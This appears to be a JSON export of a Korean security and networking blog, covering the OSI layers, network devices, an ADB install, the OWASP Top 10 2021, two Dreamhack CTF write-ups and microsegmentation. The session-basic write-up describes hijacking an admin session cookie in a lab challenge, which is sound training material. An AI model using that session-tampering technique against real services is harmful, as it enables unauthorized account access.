HUB, 통신 케이블, 리피터 등  L2 데이터 링크 계층(Data Link Layer)  데이터링크 계층은 Point to Point 간의 신뢰성 있는 전송을 보장하기 위한 계층 전송 데이터에 대한 비트 동기 및 식별 기능, 흐름제어 기능, 오류 제어 기능 등을 수행 물리주소인 MAC주소를 가지고 통신 통신 단위: Frame 대표적인 장비: 스위치와 브릿지  L3 네트워크 계층(Network Layer)  L3 계층은 서로다른 네트워크에서 데이터를 목적지까지 가장 안전하고 빠르게 전달하는 역할을 함 논리적 링크를 설정하고 상위 계층 데이터를 작은 크기의 패킷으로 분할하여 전송하는 역할을 수행 통신 단위: Packet Protocol: IP, arp, rarp, icmp 등 대표적인 장비: Router, L3 Switch 등  L4 전송 계층(Transport Layer)  양 끝단(End to End)의 사용자들이 데이터를 주고 받을 수 있게 하는 계층 특정한 프로세스 사이에서 세션이라 불리는 연결을 확립하고 유지하며 동기화하는 기능을 제공 통신단위: Segment Protocol: TCP/UDP, TCP/IP  L5 세션 계층(Session Layer)  Application간 논리적인 연결인 세션의 생성, 관리 및 종료를 담당 세션 계층부터 데이터를 만들어내는 계층 양 끝단의 응용 프로세스가 통신을 관리하기 위한 방법을 제공 동시 송수신 방식(duplex), 반이중 방식(half-duplex), 전이중 방식(Full Duplex)의 통신과 함께, 체크 포인팅과 유휴, 종료, 다시 시작 과정 등을 수행  L6 표현 계층(Presentation Layer)  데이터 표현방식 변환을 담당 인코딩(Encoding)/디코딩(Decoding), 압축(Compression)/압축 해제(Decompression), 암호화(Encryption)/복호화(Decryption) 등을 담당  L7 응용 계층(Application Layer)  사요자가 네트워크에 접근할 수 있는 인터페이스를 담당 네트워크 서버/클라이언트 프로그램 Protocol: HTTP,FTP, SMTP, POP3 등  출처 및 참고  https://velog.io/@dyllis/OSI-7계층-정리 https://whatsup95.tistory.com/19  ","date":"2022-02-19T14:28:48+09:00","image":"https://appealso.github.io/p/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC-2-osi-7-layer/network_hu7c2d7e014291615816b31fb9f4a70106_112373_120x120_fill_q75_box_smart1.jpeg","permalink":"https://appealso.github.io/p/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC-2-osi-7-layer/","title":"네트워크 기초 정리 (2) - OSI 7 Layer"},{"content":"업무만 하다기 보니 기초지식을 점점 잊는 것 같아 정리하는 시간을 가져보려고 합니다. 이번 포스트에서는 네트워크 기초인 네트워크 장비들에 대해 대략적인 내용을 정리했습니다. 추가가 필요한 내용은 덧글 남겨주시면 추가하도록 하겠습니다.\n 네트워크 장비 스위치  스위치 \n 스위치는 PC나 서버에 있어 네트워크 입구에 해당하는 네트워크 기기이다. 스위치는 MAC 주소를 사용해 같은 네트워크의 포트 간 데이터 전송을 수행한다 Switch는 전통적인 L2 Switch 와 Multi Layer Switch(MLS) L3 / L4 / L7 Switch로 구분  스위치 기능  특정 포트 활성화 및 비활성화 이중(반이중 또는 전이중) 설정 및 대역폭 구성 특정 포트의 서비스 품질(QoS) 수준 설정 MAC 필터링 및 기타 액세스 제어 기능 활성화 링크 상태를 포함한 기기의 SNMP 모니터링 설정 네트워크 트래픽 모니터링을 위한 포트 미러링 설정  스위치 종류 L2 스위치(L2 Switch)  스위치의 기본 정의에 가장 부합하는 것이 L2 스위치 L2 스위치를 그냥 스위치로 부르기도 함 OSI7 계층에서 Layer 2 는 데이터 링크 계층 (Data Link Layer)장비 이더넷 레벨에서만 동작하기 때문에 IP Address 단위 서비스인 라우팅이 불가  L3 스위치(L3 Switch)  네트워크 계층(Network Layer)에서 동작을 하므로 IP 스위칭이 가능 즉 L3 스위치는 라우터 기능도 갖게 됨 L3 스위치의 경우 라우터보다 가격 및 성능은 우수하나 소프트웨어 기능 (F/W, I PS, VPN 등 )이 적다는 차이점이 있음  L4 스위치(L4 Switch)  L4 스위치는 계층 4 단계인 전송 계층(Transport Layer)에서 동작 L4 단계의 프로토콜인 TCP/UDP 등에서 스위칭을 수행 TCP 와 UDP 등의 헤더를 보고 그것이 FTP 인지 HTTP인지 아니면 SMTP 인지를 구분한 후 어떤 것을 우선시해서 스위칭 할지 판단 할 수 있음 즉, 로드 밸런싱이 가능해 진다는 것으로 이는 L3 스위치 이하에서는 불가능   로드 밸런싱(Load Balancing):컴퓨터 네트워크 기술의 일종으로 둘 혹은 셋 이상의 중앙처리장치 혹은 저장 장치와 같은 컴퓨터 자원들에게 작업을 나누는 것\n L7 스위치(L7 Switch)  L7 스위치 는 OSI7 계층 중 가장 상위의 계층인 응용 계층(Application Layer)에서 동작을 하는 스위치로 상당히 다양한 조건으로 로드 밸런싱이 가능 이메일의 제목이나 문자열을 보고 내용을 파악한다거나 HTTP 의 URL, 또는 FTP 의 파일명, 쿠키 정보 등을 분석해서 보안에 유리하고 더욱 정교한 로드 밸런싱을 가능케 함   라우터 개요  라우터 \n 서로 다른 네트워크 간에 중계 역활을 해주는 장치 라우터는 IP 주소를 사용, 네트워크 간의 데이터 전송을 수행하며 이를 ‘Routing’ 이라고 함 NAT(Network Address Translation), 방화벽, VPN(Virtual Private Network), QoS(Quality of Service)등 다양한 부가 기능을 함께 제공하기도 함 L3 스위치가 라우터 역할을 하기도 함 OSI7계층 중 3 계층에 속하는 장비  라우팅 프로토콜의 종류  라우팅프로토콜 \nStatic Routing(정적 라우팅)  관리자가 네트워크에 대한 경로 정보를 직접 지정하여 라우팅 관리자에 의한 라우팅 정보만을 참조하여 라우터 자체 부담이 하락 동적 라우팅보다 빠르며 안정적 네트워크가 복잡해질수록 관리가 힘듬  Dynamic Routing(동적 라우팅)  대규모 네트워크에 사용 라우터 간의 변경된 네트워크에 대한 정보를 자동으로 교환하여 라우팅 Routing table을 자동으로 작성하여 관리자의 초기 설정만 필요 Static Routing 보다 메모리를 많이 차지한다는 단점이 있음   라우팅프로토콜 \nIGP(Internal Gateway Routing Protocol)  동일 그룹 네트워크에서 라우팅 정보를 교환할 때 사용되는 라우팅 프로토콜 라우터로 서로 연결되어 있는 네트워크 집합을 도메인 or AS(Autonomous System)이라고 함  EGP(External Gateway Routing Protocol)  다른 그룹과 라우팅 정보를 교환할때 사용되는 라우팅 프로토콜  Distance Vector  Routing table을 위한 요소를 거리와 방향에 중점을 둔 라우팅 알고리즘 Routing table을 연결된 라우터와 교환하여 생성 홉 수를 기준으로 최적 경로를 결정 모든 라우터들은 주기적으로 서로 Routing table을 교환하면서 Routing 정보에 변화가 없는지 관리하는데 이에 대한 프로토콜로 RIP와 IGRP가 있음  Link State Vector  Link State는 Distance Vector가 가지고있는 단점을 극복하고자 만들어짐 Link State는 네트워크의 토폴로지 정보를 DB로 구성하고 이를 사용하여 SPF(Shortest Path First) 알고리즘을 사용하여 Routing table을 작성 네트워크 상에서 변화가 있을때만 Routing 정보를 전달 주기적으로 Routing 정보를 전송하는 Distance Vector보다는 트래픽이 적음 토폴로지 등 다른 정보를 사용하기에 메모리를 많이 사용 계층적 구조를 가져 환경설정이 복잡   리피터  신호를 수신하여 신호를 증폭한 후 다음 구간으로 재전송하는 장치 OSI 7계층 중에서 1계층인 물리계층에서 동작하는 장비 근거리 통신망을 구성하는 세그먼트들을 확장하거나 서로 연결하는데 주로 사용 신호 감쇠를 보상해 주기 때문에 신호를 먼 거리까지 데이터를 전달하는 것이 가능 전체 LAN에 접속할 수 있는 장비의 수 증가   허브  OSI 7계층 중에서 1계층인 물리계층에서 동작하는 장비 다수의 pc와 장치들을 묶어서 LAN을 구성할 때 각각의 PC에 연결된 노들을 한곳으로 모으는 역할을 해주는 장치 UTP 랜 케이블을 이용하여 가까운 거리에 있는 컴퓨터들을 연결시켜 주는 네트워크 장비 허브는 단순히 중계기 역할 컴퓨터 b가 컴퓨터 c로 신호를 보내면, 그 신호는 c한테만 가는게 아니라 연결된 모든 컴퓨터로 전송(브로드캐스트(Broadcast))   참고 및 출처  https://blog.naver.com/PostView.nhn?blogId=withnetworks\u0026logNo=222004830412 https://puzzle-puzzle.tistory.com/entry/네트워크-용어-라우터란-Router https://nasa1515.tech/network-for-beginner/ https://nasa1515.tech/network-for-beginner2/  ","date":"2022-02-17T20:39:00+09:00","image":"https://appealso.github.io/p/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC-1-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%9E%A5%EB%B9%84/network_hu7c2d7e014291615816b31fb9f4a70106_112373_120x120_fill_q75_box_smart1.jpeg","permalink":"https://appealso.github.io/p/%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EA%B8%B0%EC%B4%88-%EC%A0%95%EB%A6%AC-1-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%9E%A5%EB%B9%84/","title":"네트워크 기초 정리 (1) - 네트워크 장비"},{"content":"ADB 설치 # Home Brew 통한 Install  $ brew cask install android-platform-tools # adb 버전 확인 $ adb version Android Debug Bridge version 1.0.41 Version 33.0.1-8253317 Installed as /usr/local/bin/adb ","date":"2022-02-17T20:39:00+09:00","image":"https://appealso.github.io/p/%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C-%EB%A3%A8%ED%8C%85-magisk/mobile_hudde33db74ab90bd0aa96568e8f63dce6_6922_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C-%EB%A3%A8%ED%8C%85-magisk/","title":"안드로이드 루팅 - Magisk"},{"content":"OWASP 정의 ■ OWASP(The Open Web Application Security Project)는 웹 애플리케이션 보안 증진을 목표로 하는 비영리단체\n■ OWASP Top 10 이라는 안전한 웹 애플리케이션 개발을 위한 가이드를 2004년부터 매 3, 4년마다 발행\nOWASP 2021 항목  owasp \nA01 - Broken Access Control (취약한 접근 통제) 개요 ■ 접근 제어(Access Control)는 사용자가 권한을 벗어난 행동을 할 수 없도록 정책을 만들고 실행하는 기능\n■ 접근 제어가 취약하게 구현되면 사용자는 주어진 권한을 벗어나 인가되지 않은 데이터에 무단으로 접근해, 조작이나 삭제하는 등을 할 수 있음\n■ OWASP Top 10 - 2017에서 A05번에 위치하던 Broken Access Control(취약한 접근 통제)이 4단계 상승하여 첫 번째 위치(A01)로 이동\n■ 과거에는 하나의 서비스 또는 시스템(Monolithic Architecture)으로 소프트웨어를 구성하는 방식으로 애플리케이션을 구성했지만 현재 애플리케이션들은 상호 독립적인 구성 요소로 분할 되어 있는 방식 (Microservice Architecture)으로 개발되는 경우가 많아짐\n■ 기존에는 하나의 서비스에서 접근통제(Access Control)를 담당하였지만, 기능이 여러 개로 분할되면서 접근 통제에 어려움이 존재하기 때문에 첫 번째 위치로 이동한 것으로 보임\n취약점 예시 ■ 특정 사용자에게만 부여해야 하는 권한을 기본적으로 모든 사용자에 부여하는 경우\n■ 인증되지 않은 사용자가 인증이 필요한 페이지를 강제로 탐색할 수 있는 경우\n■ 사용자로 로그인해 관리자 권한으로 활동할 수 있는 경우\n■ POST, PUT, DELETE API 요청에 대한 접근 제어가 누락된 경우\n■ 파라미터나 쿠키 등의 요청을 조작해 권한 상승 혹은 타 사용자의 권한을 사용할 수 있는 경우\n예방 방법 ■ 공용 리소스를 제외하고 기본적으로 접근을 거부하는 정책 수립(화이트 리스트 기반)\n■ 접근제어 정책이 애플리케이션 전체에 일괄 적용되도록 확인\nA02 - Cryptographic Failures (암호학적 실패) 개요 ■ 암호화에 관련한 문제들을 전반적으로 이야기하는 항목\n■ 암호화에 오류가 있거나 미흡한 부분이 있는 경우, 민감 데이터 노출로 이어짐\n■ 특히 개인정보와 금융 데이터 같은 법과 규정에 강력하게 영향을 받는 경우라면 안전하게 보호하기 위한 추가 요구 사항을 지켜야 함\n■ OWASP Top 10 - 2017에서 A03번에 위치하던 Sensitive Data Exposure(민감 데이터 노출) 항목이 Cryptographic Failures (암호학적 실패)라는 이름으로 변경\n■ 해당 항목은 1단계 상승하여 두 번째 위치(A02)로 이동했다.\n■ OWASP에서는 2017년에 존재하였던 민감 데이터 노출이 근본적인 원인이 존재하였던 것이 아니라 여러가지 분야에서 광범위하게 발생하는 증상으로 판단\n■ 2017년 이후 데이터 암호화와 관련된 이슈가 상당히 많았기 때문에 OWSAP에서는 이러한 점을 토대로 해당 항목에 대하여 단계 상승을 한 것으로 보임\n취약점 예시 ■ 내·외부망에 관계없이 데이터가 전송구간에서 평문으로 전송되는 경우(HTTP, FTP, TELNET 등)\n■ 취약한 암호화 프로토콜을 사용하는 경우(SSL v2.0, SSL v3.0, TLS v1.0, TLS v1.1)\n■ 취약한 암호화 알고리즘을 사용하는 경우(DES, RC4, MD5 등)\n■ 취약한 암호화 컴포넌트를 사용하는 경우(취약한 버전의 openssl 사용 등)\n■ 보안 헤더 설정을 통한 HSTS가 누락된 경우(HSTS: HTTP를 HTTPS로 강제 리다이렉트)\n■ 고정된 암호문을 사용하는 경우(Salt, 일회용 난수 미포함)\n■ 사설 인증서 사용, 인증서와 도메인 불일치\n■ 암호키 관리가 미흡한 경우(소스코드 하드코딩 등)\n예방 방법 ■ FTP, TELNET과 같은 레거시 프로토콜 미사용\n■ 최신 버전의 암호 프로토콜 및 안전한 암호 알고리즘 사용\n■ HSTS(HTTP를 HTTPS로 강제 리다이렉트) 설정\n■ 암호화 시 암호문이 고정되지 않도록 의사 난수 생성기를 포함\n■ 신뢰할 수 있는 기관에서 발급한 인증서 사용\nA03 - Injection (인젝션) 개요 ■ Injection은 사용자가 전달하는 데이터(파라미터, 헤더, URL, 쿠키(Cookie), Json 데이터, SOAP, XML 등 모든 형태)를 신뢰할 수 없는 데이터로 조작해서, 서버 측에서 명령어나 쿼리문의 일부로 인식하게 만들 때 발생하는 취약점\n■ OWASP Top 10 - 2017에서 A01번에 위치하던 Injection(인젝션)이 2단계 하락하여 세 번째 위치(A03)로 이동\n■ 2017년에 존재하였던 A1 - Injection 과 A7 - Cross Site Scripting(XSS)이 통합되었다. 애플리케이션에서 Broken Access Control 항목에 이어서 두 번째로 많은 취약점이 발현됨\n■ Injection은 과거부터 SQL, NoSQL, 운영체제 명령어, ORM(Object Relational Mapping), LDAP, EL(Expression Languages), OGNL(Object Graph, Navigation Library) 인젝션 등 다양한 취약점이 존재하였고, Cross site Scripting 취약점이 통합됨에 따라 여전히 위험성을 가진 취약점으로 판단되기 때문에 OWASP에서 세 번째에 위치시킨 것으로 보임\n취약점 예시 ■ SQL injection, NoSQL injection\n■ OS Command Injection\n■ ORM(Object Relational Mapping) injection\n■ LDAP injection\n■ EL(Expression Language) injection\n■ OGNL(Object Graph Navigation Library) injection\n■ Cross-site Scripting\n③ 예방 방법 ■ 사용자 입력이 SQL 문법으로 인식되지 않도록 Binding 변수를 사용(예: Prepared statement)\n■ 사용자 제공 데이터에 대한 화이트리스트 기반 서버 측 검증\nA04 - Insecure Design (안전하지 않은 설계) ① 개요 ■ Insecure Design 항목은 OWASP Top 10 - 2017에서는 존재하지 않았던 새로운 항목이다.\n■ 기획 단계와 애플리케이션 설계 과정에서의 보안사항 준수를 의미하고 있으며, 설계 과정에서 발생하는 보안적인 결함을 의미\n■ 설계가 잘못된 애플리케이션은 추후에 진행하는 보안테스트로 발견한 사항을 쉽게 조치할 수 없거나, 위험성을 가지고 운영해야 하는 경우들이 많기 때문에 해당 항목이 새롭게 등장한 것으로 보임\n kisa  소프트웨어 개발보안 방법론(출처: KISA)\nA05 - Security Misconfiguration (보안 오류 설정) 개요 ■ 보안 설정 오류(Security Misconfiguration)는 애플리케이션을 최초 설치하거나 업데이트할 때 보안성을 고려하지 않은 설정으로 인해 취약점이 발생하는 경우\n■ OWASP Top 10 - 2017에서 A06번에 위치하던 Security Misconfiguration(보안 오류 설정) 항목이 A04번 XML External Entities(XXE)항목과 통합되었고, 이로 인하여 한 단계 상승하여 다섯 번째 위치(A05)로 이동\n■ 안전하게 설계된 애플리케이션을 개발하더라도 테스트 및 디버깅을 위하여 옵션을 잘못 설정하는 경우가 다수 존재하기 때문에 OWASP에서는 해당 취약점의 순위를 한 단계 상승 시킨 것으로 보임\n취약점 예시 ■ 불필요한 기능을 활성화했거나 설치함(예: 불필요 포트, 불필요 페이지, 불필요 계정/권한 등)\n■ 벤더사에서 기본으로 제공하는 관리자 계정(ID/Password)을 변경하지 않고 사용\n■ 에러 페이지를 통한 애플리케이션 에러 정보 노출\n■ 보안 헤더 설정 누락\n■ 서버 OS, 프레임워크, 라이브러리, 데이터베이스 등의 보안 설정 누락\n예방 방법 ■ 애플리케이션 설치 시 불필요한 기능, 구성요소, 샘플, 문서 등은 제거\n■ 보안 헤더 설정\n■ 모든 환경에서 애플리케이션 보안 설정을 검증하고 자동화된 프로세스 구현\nA06 - Vulnerable and Outdated Components (취약하고 지원이 종료된 컴포넌트) 개요 ■ 취약하고 지원이 종료된 구성 요소(Vulnerable and Outdated Components)는 취약한 버전 또는 EOS/EOL/EOD(소프트웨어 기술 지원 중단) 상태인 소프트웨어를 계속 사용하는 경우를 뜻하며, 그로 인해 발생할 수 있는 모든 보안 위협을 포함\n■ 서비스를 구성하는 모든 요소(OS, WEB/WAS, 데이터베이스, 애플리케이션, API, 라이브러리, 프레임워크 등)가 여기에 해당\n■ 오픈소스를 기반으로 다양한 라이브러리와 컴포넌트들이 연결되는 애플리케이션의 경우 제공되는 라이브러리와 컴포넌트에 알려진 취약점이 존재할 수 있음\n■ 이런 상황에서 라이브러리, 컴포넌트에 존재하는 취약점은 어플리케이션 자체에도 취약점을 내포하게 할 수 있고, 가장 큰 문제점은 개발자가 이를 쉽게 식별하기 어렵다는 문제가 있다.\n■ OWASP Top 10 - 2017에서A09번 위치하던Using Components with Known Vulnerabilities(알려진 취약점이 있는 구성요소 사용) 항목이 Vulnerable and Outdated Components(취약하고 오래된 컴포넌트)라는 이름으로 변경\n■ 해당 항목은 3단계 상승하여 여섯 번째 위치(A06)로 이동되었으며 최근 소프트웨어 개발을 모듈화하여 진행하는 경우가 많아지고 있기 때문에 OWASP에서는 해당 취약점의 순위를 변경한 것으로 보임\n취약점 예시 ■ 지원 종료된 OS 사용(Windows XP, Windows server 2000 등)\n■ 알려진 취약점이 존재하는 버전의 애플리케이션 사용(nginx, apache tomcat, 오픈소스 웹 에디터, WordPress 등)\n■ 알려진 취약점이 존재하는 버전의 프레임워크 사용(Apache Struts 2, Spring 등)\n■ 알려진 취약점이 존재하는 버전의 라이브러리 사용(OpenSSL 등)\n③ 예방 방법 ■ 불필요한 소프트웨어는 제거\n■ 형상 관리를 통해 사용하는 모든 소프트웨어 버전 체크\n■ 패치 관리 프로세스를 수립해 소프트웨어 최신 버전 유지\n■ 알려진 취약점을 지속적으로 모니터링해 취약한 소프트웨어 사용 확인\nA07 - Identification and Authentication Failures (식별 및 인증 실패) 개요 ■ OWASP Top 10 - 2017에서 A02에 위치하던 Broken Authentication(취약한 인증)항목이 Identification and Authentication Failures(식별 및 인증 실패)라는 이름으로 변경됨\n■ 다섯 단계 하락하여 일곱 번째 위치(A07)로 이동했다.\n■ 해당 항목은 현재 개발되는 소프트웨어에서 개발 프레임워크의 가용성이 증가함에 따라 순위가 하락한 것으로 보이지만 많은 서비스들에서 자주 발견되는 취약점이기 때문에 주의를 요할 필요가 있다.\n취약점 예시 ■ Multi-factor 인증이나 2차 인증 부재로 Credential Stuffing, Brute forcing 공격 등에 노출되는 경우\n■ 인증 실패에 대한 제한이 없어 Brute forcing 공격에 노출되는 경우\n■ 안전한 비밀번호 생성 정책이 없어, 취약한 비밀번호 생성을 허용하는 경우\n■ URL에 인증 세션 ID가 노출되는 경우(GET Method)\n■ 로그인 후 새로운 세션 ID로 발급하지 않고 기존 세션 ID를 재사용하는 경우\n■ 세션 타임아웃이 없거나 로그아웃 후 세션 파기를 하지 않는 경우\n예방 방법 ■ Multi-factor 인증이나 2차 인증 구현\n■ 안전한 비밀번호 생성 정책 및 인증 실패 횟수 제한 적용\n■ 로그인 시 새로운 세션 ID를 생성하고 인증 세션은 암호화된 채널에서 헤더를 통해 전송\n■ 세션 파기 및 만료 정책 수립\nA08 - Software and Data Integrity Failures (소프트웨어와 데이터 무결성 실패) 개요 ■ OWASP Top 10 - 2017에서 존재하지 않았던 항목 존재하지 않았던 새로운 항목이며, 2017년에 존재했던 Insecure Deserialization(안전하지 않는 역직렬화)가 해당 항목에 포함됨\n■ 소프트웨어 및 데이터 무결성 오류는 애플리케이션이 신뢰할 수 없는 소스, 저장소 및 CDN, 플러그인, 라이브러리, 모듈에 의존하는 경우에 발생\n■ 안전하지 않은 CI/CD 파이프라인은 개발 및 배포 과정에서 애플리케이션이 변조되면 무결성이 훼손될 가능성이 있으므로, 애플리케이션이 사용하는 코드에 대한 무결성 검증 절차를 추가해야 함\n■ 무결성을 증명하지 않은 소프트웨어 업데이트, 중요 데이터 및 CI/CD 파이프라인과 관련된 내용이다. 대표적인 예로 애플리케이션에서의 신뢰할 수 없는 소스코드, 라이브러리 또는 모듈에 의존하는 경우를 들 수 있다.\n취약점 예시 ■ 애플리케이션이 사용하는 라이브러리나 모듈에 대한 무결성 검증이 없어 변조가 가능한 경우\n■ 업데이트 공급망에 대한 검증이 없는 경우\n■ CI/CD 파이프라인에 대한 적절한 보안성 검토가 없는 경우\n■ 직렬화된 데이터에 대한 무결성 검증이 없는 경우\n③ 예방 방법 ■ 전자서명, 해시 알고리즘 등을 사용해 애플리케이션 무결성을 검증\n■ 사용하고 있는 라이브러리가 신뢰할 수 있는 저장소를 사용하고 있는지 확인하고, 중요한 서비스라면 내부 저장소를 별도로 지정해 사용\n■ CI/CD 파이프라인에 대한 정기적인 보안성 검토 수행\n■ 직렬화/역직렬화 라이브러리를 사용하는 경우, 직렬화 된 데이터에 대해 무결성 검증을 수행\nA09 - Security Logging and Monitoring Failures (보안 로깅과 모니터링 실패) 개요 ■ OWASP Top 10 - 2017에서 A10번에 위치하던 Insufficient Logging \u0026amp; Monitoring(불충분한 로깅과 모니터링)항목으로 이름이 새롭게 변경됨\n■ 해당 항목은 보안 업계 설문조사에서 3위를 차지하였고, 한단계 상승한 아홉 번째 위치 (A09)로 이동하였다.\n■ 해당 항목은 기존 보다 더 많은 종류의 이슈를 포함하도록 확장됨\n■ 적절한 로깅과 모니터링이 없다면 공격을 감지하고 대응할 수가 없기 때문에, 취약점 공격 예방 뿐 아니라 공격 발생 감지 및 대응까지 포함하는 것으로 개정됨\n취약점 예시 ■ 로그인, 인증 실패, 권한 설정 등 중요 기능 수행에 대한 로깅이 없는 경우\n■ 일정 주기로 로그에 대한 백업 절차가 없는 경우\n■ 로깅 및 모니터링이 필요한 부분을 명확하게 구분해서 로깅하지 않아, 불명확한 로깅 및 모니터링을 하는 경우\n예방 방법 ■ 모든 로그인, 접근 제어, 인증 실패에 대해 로깅을 하고 정기적인 백업을 통해 보관\n■ 로그 관리 솔루션 등을 활용하기 위해 적절한 형식으로 로깅이 생성되는지 확인\n■ 의심스러운 활동을 감지하고 신속하게 대응할 수 있도록 임계치를 설정하고 모니터링\n■ 침해 사고 대응 및 복구 계획 수립\nA10 - Server Side Request Forgery (서버 사이드 요청 변조) 개요 ■ OWASP Top 10 - 2017에는 존재하지 않았던 항목이고, 보안 업계 설문조사에서 1위를 차지하며 새롭게 추가된 항목\n■ 애플리케이션이 사용자 제공 데이터를 적절한 검증 없이 로컬 및 원격 리소스를 가져와 취약점을 발생시키는 상황을 의미\n■ 웹 어플리케이션 방화벽(WAF), 방화벽, 또는 네트워크 ACL이 보호하고 있는 시스템을 SSRF을 통해 공격 가능 다양한 취약점이 발현될 수 있어 새롭게 추가됨\n취약점 예시 ■ 서버가 적절한 검증 절차 없이 사용자 요청을 로컬 혹은 원격 리소스에 접근하도록 하는 경우\n예방 방법 ■ 서버가 속한 내부 네트워크끼리 통신할 때에도 방화벽을 통해 접근제어 규칙을 적용\n■ 모든 사용자 제공 데이터에 대한 검증\n■ 사용자 요청에 대한 서버 측 수행 결과 검증\n출처 및 참고자료 ■ http://www.igloosec.co.kr/BLOG_%ED%95%9C%EB%B0%9C%20%EC%95%9E%EC%84%9C%20%EC%82%B4%ED%8E%B4%EB%B3%B4%EB%8A%94%20OWASP%20Top%2010%202021%20(Draft)?searchItem=\u0026searchWord=\u0026bbsCateId=47\u0026gotoPage=1\n■ https://www.hahwul.com/2021/09/09/owasp-top-10-2021/\n■ https://netmarble.engineering/owasp-top-10-2021-2/\n■ https://netmarble.engineering/owasp-top-10-2021-1/\n■ https://owasp.org/Top10/A01_2021-Broken_Access_Control/\n■ https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\n■ https://owasp.org/Top10/A03_2021-Injection/\n■ https://owasp.org/Top10/A04_2021-Insecure_Design/\n■ https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\n■ https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/\n■ https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\n■ https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\n■ https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\n■ https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\n","date":"2022-02-15T20:52:35+09:00","image":"https://appealso.github.io/p/owasp-top10-2021/owasp_hu795b5b0a4774f2c3290e36a736e07b70_25532_120x120_fill_box_smart1_3.png","permalink":"https://appealso.github.io/p/owasp-top10-2021/","title":"Owasp Top10 2021"},{"content":"[문제]  쿠키와 세션으로 인증 상태를 관리하는 간단한 로그인 서비스입니다. admin 계정으로 로그인에 성공하면 플래그를 획득할 수 있습니다.  [해결법]  이 문제는 admin 세션을 탈취하여 변조하면 되는 문제였다. 제공하는 소스를 확인해보면 /admin 페이지가 있는 것을 확인 할 수있는데 해당 페이지에서 admin 세션 값을 획득 할 수 있었다. 해당 세션 정보로 쿠키에 저장되어있는 세션값을 변조하면 통과할 수 있다.  ","date":"2022-02-13T11:03:12+09:00","permalink":"https://appealso.github.io/p/dreamhack-session-basic/","title":"[dreamhack] session-basic"},{"content":"[문제]  입력 폼에 데이터를 입력하여 맞으면 플래그, 틀리면 NOP !을 출력하는 HTML 페이지입니다. main 함수를 분석하여 올바른 입력 값을 찾아보세요 !  [해결법]  이 문제는 난독화된 html 파일을 해독하는 문제였다. 끝에 for loop만 잘 수정해주면 답이 나오는 문제였는데 변수 별로 의미를 파악하려다 보니 삽질을 좀 했다. for loop 수정 부분은 아래 참고하면 된다.\n var s = \u0026#34;\u0026#34;; for (var i = 0x0; i \u0026lt; 36; i++) { s += String.fromCharCode( operator[i % operator[_0x374fd6(0x17c)]](_0x4949[i], _0x42931[i]) ); } console.log(s); ","date":"2022-02-05T21:40:29+09:00","permalink":"https://appealso.github.io/p/dreamhack-funjs/","title":"[dreamhack] funjs"},{"content":"마이크로 세그멘테이션 과거 컴퓨터 시스템, 네트워크 및 응용 프로그램은 상대적으로 정적이었습니다. 동일한 네트워크를 따라 흐르는 데이터 연결, 매일, 응용 프로그램은 동일한 시스템에서 실행되었으며, 정적 방화벽 규칙 및 액세스 제어 목록 (ACL)을 사용하여 시스템 간 트래픽을 제한할 수 있습니다. 그러나 오늘날의 IT 환경은 훨씬 복잡하고 역동적입니다.\n  다중 계층 애플리케이션은 종종 여러 데이터 센터와 클라우드 플랫폼 걸쳐 있습니다. 응용 프로그램은 매일 릴리스 되고 향상됩니다. 소프트웨어 모듈은 새 가상 머신에서 스핀업 된 다음 서로 다른 물리적 서버 간에 이동합니다. 새로운 인스턴스의 모듈은 요구에 따라 Scale up and down합니다. 조직에서는 지속적으로 애플리케이션 이동, 클라우드 리소스 활용 및 워크로드 통합 시 데이터 센터를 재구성 해야합니다.   대부분의 IT 영역은 이러한 변화 속도에 보조를 맞추었지만 보안프로세스는 여전히 수동적입니다. 이러한 결과로 기술 및 비즈니스 혁신에 브레이크를 겁니다.\n1. 기존 시스템 대부분의 데이터 센터는 아래 그림과 같이 클라우드 영역과 데이터 센터 영역으로 나뉩니다. 영역 간의 트래픽은 일반적으로 방화벽에서 트래픽 필터링 정책이 구성됩니다.  Image 1 \n2. 기존 시스템의 문제점 이와 같은 구성으로 인해 기존 시스템은 아래와 같은 문제점들이 발생합니다.\n  공격자가 방화벽으로 구분되지 않은 영역에 침투를 할 수 있을 경우 그 안에 있는 많은 응용 프로그램을 대상으로 공격을 할 수 있음 방화벽의 가격은 비싸며 네트워크 재설계가 필요할 경우 비용이 많이 발생 방화벽은 일반적으로 수천 개의 규칙으로 구성되어 정책 관리가 힘듬 데이터 센터와 클라우드 플랫폼은 서로 다른 보안 도구를 사용하기 때문에 클라우드 환경과 데이터 센터 간의 액세스 규칙을 관리하기가 매우 어려움 전체 시스템을 효과적으로 모니터링할 수 없음   3. 마이크로 세그멘테이션(Microsegmentation) 마이크로 세그먼테이션(Microsegmentation)은 IT 환경을 통제 가능한 구역으로 분할해 각 워크로드를 상호 안전하게 격리하는 동시에 네트워크 보호를 더 세분화함으로써 승인되지 않은 횡적 이동 문제에 대처하는 방법론입니다.  Image 2 \n마이크로세그먼테이션은 성능과 관리에 중점을 둔 네트워크 세그먼테이션(network segmentation)의 단순한 연장선상에 있는 기술이 아닌 네트워크 보호 문제에 대처해 위험을 낮추고 동적인 IT 환경의 요구에 상응해 보안을 조정하기 위한 목적으로 설계된 기술입니다.  Image 3  Image 4  마이크로세그먼테이션은 하나의 중앙 정책을 사용하되 보안 집행은 각각의 개별 시스템으로 분산시킵니다. 경계만이 아니라 조직 네트워크 전반에서 세분화된 정책 실행을 가능하게 해줍니다. 이 접근 방식이 